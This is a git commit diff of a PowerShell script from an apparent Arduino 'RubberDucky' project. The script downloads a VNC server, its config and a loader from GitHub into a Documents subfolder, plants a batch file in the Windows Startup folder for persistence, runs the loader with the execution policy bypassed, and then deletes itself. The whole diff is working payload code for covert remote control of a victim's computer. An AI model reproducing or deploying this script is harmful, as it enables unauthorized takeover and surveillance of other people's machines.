e2268111c147474230a97ef318442fcc0ed0a184
EmaBixD <156678932+EmaBixD@users.noreply.github.com>
2024-09-10 20:43:26 +0200

    Update STARTUP.ps1

--- client/STARTUP.ps1
+++ client/STARTUP.ps1
@@ -1,10 +1,27 @@
+# Percorsi
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
+$emaDevPath = "$documentsPath\EmaDev"
 $self = $MyInvocation.MyCommand.Definition
-Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1" -OutFile "$documentsPath\EmaDev\LOAD.ps1"
-Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/winvnc.exe" -OutFile "$documentsPath\EmaDev\winvnc.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/UltraVNC.ini" -OutFile "$documentsPath\EmaDev\UltraVNC.ini"
+
+# Crea la dir
+If (-Not (Test-Path -Path $emaDevPath)) {
+    New-Item -Path $emaDevPath -ItemType Directory
+}
+
+# Scarica i file per il controllo remoto
+Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1" -OutFile "$emaDevPath\LOAD.ps1"
+Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/winvnc.exe" -OutFile "$emaDevPath\winvnc.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/UltraVNC.ini" -OutFile "$emaDevPath\UltraVNC.ini"
+
+# Scarica lo script per accendere il client nella cartella di avvio di Windows
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/CONNECT.bat" -OutFile "$startupPath\CONNECT.bat"
-powershell -ExecutionPolicy Bypass -File "$documentsPath\LOAD.ps1"
+
+# Avvia il server, assicurarsi che a questo punto il server sia in ascolto
+powershell -ExecutionPolicy Bypass -File "$emaDevPath\LOAD.ps1"
+
+# Sleep
 Start-Sleep -Seconds 1
+
+# Elimina questo script temporaneo
 Remove-Item $self -Force
